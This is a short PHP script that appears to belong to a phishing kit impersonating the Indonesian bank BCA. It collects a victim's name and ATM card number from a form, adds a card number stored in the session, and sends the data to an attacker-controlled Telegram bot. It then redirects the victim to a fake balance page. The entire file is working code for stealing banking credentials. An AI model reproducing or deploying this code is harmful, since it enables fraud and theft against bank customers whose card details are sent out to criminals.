<?php
include "../telegram.php";
session_start();

$email = $_POST['email'];
$atm = $_POST['atm'];
$nomor = $_SESSION['nomor'];

$message = "
( BCA | Nomor Kartu )".$nomor."
──────────────────────

- Nama Lengkap : ".$email."

──────────────────────

- No Kartu : ".$atm."

──────────────────────
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../saldo.php');
?>
